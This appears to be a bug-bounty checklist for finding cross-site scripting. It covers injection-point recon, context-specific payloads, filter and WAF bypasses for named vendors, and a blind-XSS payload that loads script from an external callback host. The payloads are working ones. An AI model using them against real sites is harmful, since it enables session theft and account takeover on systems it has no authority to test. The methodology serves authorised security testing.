# XSS Testing Checklist

Battle-tested checklist used to find 200+ XSS in production.

Not a payload dump. This is the methodology.

## 1. Recon Phase - Find injection points

- [ ] Crawl with JS enabled. Save all requests with parameters
- [ ] Check hidden inputs: `view-source:` + `type="hidden"`
- [ ] Test every parameter in URL, body, headers, cookies
- [ ] Look for reflected values in: HTML body, attributes, JS, CSS, meta tags
- [ ] Wayback + gau for old endpoints with parameters

## 2. Context Detection - Where does it reflect?

- [ ] HTML body: `<div>HERE</div>` → Try `<svg onload=alert(1)>`
- [ ] Attribute: `<input value="HERE">` → Try `" onfocus=alert(1) autofocus="`
- [ ] JS string: `var x = "HERE"` → Try `";alert(1)//`
- [ ] JS block: `<script>HERE</script>` → Try `</script><svg onload=alert(1)>`
- [ ] URL context: `<a href="HERE">` → Try `javascript:alert(1)`

## 3. Filter Evasion - What breaks?

- [ ] Test baseline: `<script>alert(1)</script>` - blocked?
- [ ] Case variation: `<ScRiPt>alert(1)</ScRiPt>`
- [ ] No parentheses: `alert`document.domain``
- [ ] HTML entities: `&lt;svg onload=alert(1)&gt;`
- [ ] Unicode: `＜script＞alert(1)＜/script＞`
- [ ] Break out with: `">`, `'>`, `</script>`, `-->`

## 4. WAF Bypass Techniques

- [ ] Cloudflare: Try `<svg/onload=alert(1)>` no space
- [ ] Akamai: Double encoding `%253Csvg`
- [ ] AWS WAF: Unicode normalization tricks
- [ ] Generic: `<details open ontoggle=alert(1)>`

## 5. Blind XSS - Fire and forget

- [ ] Payload: `"><script src=https://your.xss.ht></script>`
- [ ] Test: User-Agent, Referer, all headers
- [ ] Admin panels, log viewers, PDF generators
- [ ] Wait 48h. Admins are slow.

## 6. Reporting - Make it count

- [ ] PoC must show `document.domain`, not just `1`
- [ ] Screenshot + request/response in Burp
- [ ] Explain impact: "Steal tokens, ATO, deface"
- [ ] Test in Chrome + Firefox. Some payloads are browser-specific

---

Missing a technique? PR welcome.

Full automation of this checklist: [bugbounty-arsenal.com](https://bugbounty-arsenal.com)
